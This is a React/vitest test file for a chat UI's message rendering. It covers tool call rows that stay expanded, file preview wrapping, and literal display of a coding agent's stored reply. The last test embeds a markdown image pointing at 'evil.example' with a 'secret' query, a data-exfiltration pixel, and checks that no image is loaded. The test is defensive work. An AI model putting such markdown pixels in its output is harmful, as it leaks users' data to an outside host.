/**
 * chat-ui's MessageContent across re-renders: a tool call row must stay mounted
 * (and keep its expanded state) when the message around it changes.
 */

import MessageContentUI from "@neore/chat-ui/chat/message-content";
import type { ChatMessage } from "@neore/chat-ui/types";
import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import { toUIMessages } from "@/lib/agent";

import { buildHostReply } from "../../../../../../backend/lunora/acp/lib/reply";

// Unit tests do not compile the Lingui macros; chat-ui's rows call `useLingui`.
vi.mock("@lingui/react/macro", () => {
    return {
        Plural: ({ other, value }: { other: string; value: number }) => other.replace("#", () => String(value)),
        Trans: ({ children }: { children: unknown }) => children,
        useLingui: () => {
            return {
                i18n: { _: (descriptor: { id: string; message?: string }) => descriptor.message ?? descriptor.id, locale: "en" },
                t: (strings: TemplateStringsArray, ...values: unknown[]) => String.raw({ raw: strings }, ...values),
            };
        },
    };
});

const LOOKUP_BUTTON = /lookup/u;

const message = (text: string): ChatMessage =>
    ({
        id: "m1",
        parts: [
            { input: { query: "weather" }, output: { ok: true }, state: "output-available", toolCallId: "call-1", type: "tool-lookup" },
            { text, type: "text" },
        ],
        role: "assistant",
        status: "success",
    }) as unknown as ChatMessage;

describe("message content tool call rows", () => {
    it("keeps a tool call expanded when the message re-renders", () => {
        const { rerender } = render(<MessageContentUI message={message("first")} />);

        fireEvent.click(screen.getByRole("button", { name: LOOKUP_BUTTON }));

        expect(screen.getByRole("button", { name: LOOKUP_BUTTON }).getAttribute("aria-expanded")).toBe("true");

        rerender(<MessageContentUI message={message("first, then more")} />);

        // A fresh component type per render remounted the row and collapsed it.
        expect(screen.getByRole("button", { name: LOOKUP_BUTTON }).getAttribute("aria-expanded")).toBe("true");
    });
});

describe("message content file previews", () => {
    it("wraps an embedded file in .message-text-fixed, so the chat text size does not resize its controls", () => {
        const withFile = {
            id: "m2",
            parts: [{ filename: "notes.bin", mediaType: "application/octet-stream", type: "file", url: "https://files.test/notes.bin" }],
            role: "user",
            status: "success",
        } as unknown as ChatMessage;

        const { container } = render(<MessageContentUI message={withFile} />);

        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about DOM structure
        expect(container.querySelector(".message-text-fixed")).not.toBeNull();
    });
});

describe("a coding agent's stored reply", () => {
    it("stays literal from the saved row through toUIMessages to the page: no remote image is loaded", () => {
        const reply = buildHostReply({
            agentKey: "claude",
            reason: "finished",
            transcript: {
                children: [],
                media: [],
                reasoning: "",
                text: "Chart ![c](out/chart.png) and a pixel ![](https://evil.example/?q=secret).",
            },
        });
        const row = { ...reply, _creationTime: 1, _id: "m1", order: 1, stepOrder: 0, threadId: "t1", tool: false, userId: "u1" };
        const [ui] = toUIMessages([row as never]);
        const { container } = render(<MessageContentUI message={ui as unknown as ChatMessage} />);

        // eslint-disable-next-line testing-library/no-container, testing-library/no-node-access -- the assertion is about what the DOM may fetch
        expect(container.querySelector("img")).toBeNull();
        expect(container.textContent).toContain("![](https://evil.example/?q=secret)");
    });
});
